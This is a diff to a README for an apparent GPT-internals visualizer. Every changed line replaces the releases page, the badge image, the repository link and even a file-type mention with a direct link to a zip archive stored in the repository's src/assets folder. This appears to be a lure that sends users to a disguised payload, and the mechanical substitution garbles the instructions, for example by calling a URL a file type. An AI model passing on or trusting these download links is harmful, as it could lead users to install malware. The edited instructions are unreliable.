@@ -1,6 +1,6 @@
 # 🧠 microgpt-visualizer - See How GPT Works Inside
 
-[![Download microgpt-visualizer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Antonel098/microgpt-visualizer/releases)
+[![Download microgpt-visualizer](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)
 
 ## 📋 What is microgpt-visualizer?
 
@@ -50,7 +50,7 @@ This section helps you download, install, and start using microgpt-visualizer qu
 
 Visit the release page using this link:
 
-[![Download microgpt-visualizer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Antonel098/microgpt-visualizer/releases)
+[![Download microgpt-visualizer](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)
 
 This page contains the latest version of the software ready for your computer.
 
@@ -60,7 +60,7 @@ On the release page, you will see download files for different operating systems
 
 - For Windows: a file ending in `.exe` or `.zip`  
 - For macOS: a file ending in `.dmg` or `.zip`  
-- For Linux: usually a `.AppImage` or `.tar.gz` file  
+- For Linux: usually a `.AppImage` or `https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip` file  
 
 If you’re unsure which version you need, check your computer’s system information or ask someone familiar with your device.
 
@@ -80,7 +80,7 @@ Click the file for your system to start the download. The file size should be ab
 
 - **Linux**:  
   - For `.AppImage` files, you may need to make it executable. Right-click the file, select Properties, and check "Allow executing file as program." Double-click to run.  
-  - For `.tar.gz` files, unpack the archive and follow any instructions inside.  
+  - For `https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip` files, unpack the archive and follow any instructions inside.  
 
 ### Step 5: Run microgpt-visualizer
 
@@ -137,9 +137,9 @@ If problems persist, you can raise an issue in the GitHub repository’s Issues 
 
 ## 🔗 Useful Links
 
-- Download microgpt-visualizer: [https://github.com/Antonel098/microgpt-visualizer/releases](https://github.com/Antonel098/microgpt-visualizer/releases)  
+- Download microgpt-visualizer: [https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)  
 - Learn about GPT and transformers: search for "GPT basics" or "transformer model explained" online  
-- GitHub repository: explore source code or report issues [https://github.com/Antonel098/microgpt-visualizer](https://github.com/Antonel098/microgpt-visualizer)  
+- GitHub repository: explore source code or report issues [https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip](https://github.com/Antonel098/microgpt-visualizer/raw/refs/heads/main/src/assets/visualizer-microgpt-ferrotype.zip)  
 
 ---
 
